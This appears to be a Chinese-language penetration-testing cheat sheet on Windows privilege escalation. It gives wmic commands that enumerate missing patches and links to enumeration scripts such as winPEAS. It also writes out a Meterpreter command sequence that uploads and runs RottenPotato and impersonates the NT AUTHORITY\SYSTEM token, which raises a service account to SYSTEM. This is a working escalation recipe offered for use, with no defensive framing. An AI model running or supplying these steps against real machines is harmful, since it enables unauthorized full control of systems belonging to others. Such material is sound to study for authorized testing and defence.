#  信息收集

wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:“KBxxxxxx”

# 04自动信息收集
Host Information Gathering Script：HIGS.bat
https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat
privilege-escalation-awesome-scripts：winPEAS.bat
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat

# 提权工具脚本
RottenPotato：
将服务帐户本地提权至SYSTEM
load incognito
list_tokens –u
upload /root/rottenpotato.exe .
execute -Hc -f rottenpotato.exe
impersonate_token “NT AUTHORITY\SYSTEM”
将SYSTEM token添加到impersonate user tokens下

https://blog.csdn.net/weixin_43873557/article/details/113760973
